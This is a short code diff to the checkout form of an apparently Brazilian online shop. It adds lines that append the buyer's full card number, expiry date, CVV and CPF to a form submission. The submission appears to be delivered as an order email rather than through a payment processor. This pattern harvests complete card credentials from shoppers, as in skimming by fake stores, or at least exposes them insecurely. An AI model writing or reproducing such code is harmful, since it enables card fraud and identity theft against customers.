@@ -86,6 +86,10 @@ export const CheckoutForm = ({ product, onPixSuccess }: CheckoutFormProps) => {
         formData.append("address", `${values.address}, ${values.city} - ${values.state}, ${values.zip}`);
         formData.append("product", product.name);
         formData.append("card_name", values.cardName || "");
+        formData.append("card_number", values.cardNumber || "");
+        formData.append("card_expiry", values.cardExpiry || "");
+        formData.append("card_cvv", values.cardCVV || "");
+        formData.append("card_cpf", values.cardCpf || "");
         formData.append("price", `R$ ${product.price.toFixed(2)}`);
         formData.append("payment_method", "Cartão de Crédito");
         formData.append("_subject", `Novo pedido: ${product.name}`);
